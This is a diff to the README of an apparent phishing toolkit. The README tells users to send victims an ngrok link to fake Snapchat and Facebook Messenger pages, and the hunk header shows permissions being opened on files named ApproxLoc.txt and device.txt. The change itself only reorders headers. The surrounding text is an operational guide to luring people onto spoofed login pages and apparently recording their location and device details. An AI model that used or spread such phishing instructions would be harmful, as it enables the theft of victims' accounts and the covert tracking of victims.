@@ -68,14 +68,14 @@ chmod a+rwx ApproxLoc.txt && chmod 777 ApproxLoc.txt && chmod a+rwx device.txt &
 #
 **5.) Send A Link Replacing "YOUR_NGROK_LINK" With Your Unique Link (Highlighted In The Image Above)**
 #
-# SNAPCHAT:
+** SNAPCHAT:
 #
 -SC: `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/snapchat.html`
 #
-# MESSENGER:
-#
 # Real One (Top) Server Link (Bottom)
 ![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/SnapchatLink.png)
+#
+** MESSENGER:
 #
 -FB Messenger: `YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/messenger`
 #
